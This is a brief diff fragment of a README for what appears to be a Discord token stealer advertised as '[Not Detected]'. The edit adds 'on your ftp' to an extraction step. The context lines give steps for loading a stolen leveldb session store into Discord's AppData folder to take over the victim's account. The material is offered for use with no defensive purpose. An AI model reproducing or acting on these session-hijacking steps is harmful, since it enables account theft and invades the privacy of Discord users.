@@ -28,7 +28,7 @@ Discord Steal Token [Not Detected]
 
 **HOW TO GET TOKEN**
 
-- ***Extract distrucker<random>.zip*** 
+- ***Extract distrucker<random>.zip on your ftp*** 
 - ***Kill Discord***
 - ***Copy leveldb to %AppData%\Roaming\discord\Local Storage\leveldb***
 - ***Open Discord***
